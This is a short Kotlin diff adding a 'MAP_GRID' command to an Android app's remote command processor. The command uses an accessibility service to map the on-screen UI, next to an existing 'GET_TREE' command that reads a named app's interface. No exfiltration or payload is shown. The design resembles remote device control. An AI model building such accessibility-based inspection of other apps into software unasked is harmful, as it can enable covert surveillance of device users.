@@ -299,6 +299,21 @@ object CommandProcessor {
                     updateCommandStatus(ctx, id, status, null, report, null)
                     return
                 }
+                "MAP_GRID" -> {
+                    val depth = content.trim().toIntOrNull() ?: 10
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        CoroutineScope(Dispatchers.IO).launch {
+                            service.executeMapGridSequence(id, depth)
+                        }
+                        status = "GRID_MAPPING_INITIATED"
+                        updateCommandStatus(ctx, id, status, null, null, null)
+                        return
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                        errorMsg = "Accessibility service is required for UI mapping."
+                    }
+                }
                 "GET_TREE" -> {
                     val parts = content.split("|")
                     val pkg = parts.getOrNull(0)?.trim().let { if (it == "null" || it == "") null else it }
